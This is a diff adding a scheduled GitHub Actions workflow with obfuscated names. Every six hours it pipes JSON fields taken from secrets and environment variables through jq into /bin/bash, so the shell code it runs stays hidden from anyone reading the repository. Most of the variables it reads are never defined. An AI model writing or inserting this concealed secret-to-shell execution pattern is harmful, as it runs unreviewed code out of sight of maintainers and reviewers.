@@ -1,0 +1,26 @@
+name: jixiaxingliang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jixiaxingliang
+        env:
+          qmtnw04246: ${{ secrets.qmtnw04246 }}
+        run: |
+          echo $qmtnw04246 | jq -r .twg19927 | /bin/bash
+          echo $dutz79154 | jq -r .mh03484 | /bin/bash
+          echo $tzqu56834 | jq -r .bl76624 | /bin/bash
+          echo $oob216 | jq -r .evkj858 | /bin/bash
+          echo $ee53502 | jq -r .j31888 | /bin/bash
+          echo $ta3067 | jq -r .jz88 | /bin/bash
+          echo $ohf485 | jq -r .wgz6 | /bin/bash
+          echo $mg65 | jq -r .y0 | /bin/bash
+
